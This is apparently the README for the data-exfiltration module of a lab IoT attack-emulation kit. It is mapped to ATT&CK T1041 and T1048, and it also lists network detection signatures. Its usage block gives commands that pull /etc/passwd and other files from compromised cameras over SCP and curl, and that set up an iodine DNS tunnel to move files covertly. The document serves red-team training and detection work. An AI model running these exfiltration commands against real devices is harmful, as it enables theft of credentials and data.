# 08_exfil — Data Exfiltration

**Script:** `exfil.sh`  
**Session label:** `exfil`  
**ATT&CK:** T1041 (Exfil Over C2 Channel), T1048 (Exfil Over Alt Protocol — DNS)  
**Kill-chain phase:** Actions on Objectives

## Overview

Two exfiltration channels from compromised lab devices:

1. **Direct (SCP / curl)** — pull files over the WireGuard tunnel using SSH/HTTP. Fast and visible in pcap.
2. **DNS tunnelling (iodine)** — encode data in DNS queries to bypass hypothetical protocol filters. Slower; stealthier in environments that only allow DNS egress.

## Prerequisites

- Foothold on target (SSH credentials from 04_brute_force, or shell from 05_cve_exploit).
- For DNS tunnel: attack host must be the authoritative DNS server for the chosen `topdomain` (a lab-only domain like `tunnel.lab`; configure this in `/etc/hosts` or a local dnsmasq on the lab router).

## Usage

```bash
# --- Direct exfil ---
# SCP: pull /etc/passwd from a compromised camera
SSH_USER=admin ./08_exfil/exfil.sh scp  10.100.101.10  /etc/passwd

# curl: pull a snapshot frame from the Tapo C200 HTTP endpoint
./08_exfil/exfil.sh curl  10.100.101.10  /snapshot.jpg

# --- DNS tunnelling ---
# 1. On the attack host — start iodined
DNS_TUNNEL_PASS=labpass ./08_exfil/exfil.sh iodine-server  tunnel.lab

# 2. On the compromised target (via SSH) — open the client side
DNS_TUNNEL_PASS=labpass ./08_exfil/exfil.sh iodine-tunnel  tunnel.lab  10.100.101.60

# 3. Pull files through the DNS tunnel (192.168.53.2 is the target's tunnel IP)
SSH_USER=admin ./08_exfil/exfil.sh iodine-exfil  192.168.53.2  /var/log/messages
```

## Evidence

Runs write to `runs/exfil/<ts>_<target>/`:
- `cmd.txt` — exact command
- `exfil_scp/` or `exfil_curl/` — pulled files
- `tcpdump.txt`, `iodine*.txt` — tunnel setup output
- `exfil_dns_tunnel/` — files pulled via DNS tunnel
- `result` — add manually

## Detection signatures

- **SCP**: Large TCP session on port 22 from an IoT device to the attack host (unusual direction).
- **curl**: HTTP GET from attack host to device's HTTP API (unusual client).
- **DNS tunnel**: Unusually high DNS query rate; TXT/NULL queries for subdomains of `tunnel.lab`; query payload contains base32/hex-encoded data.
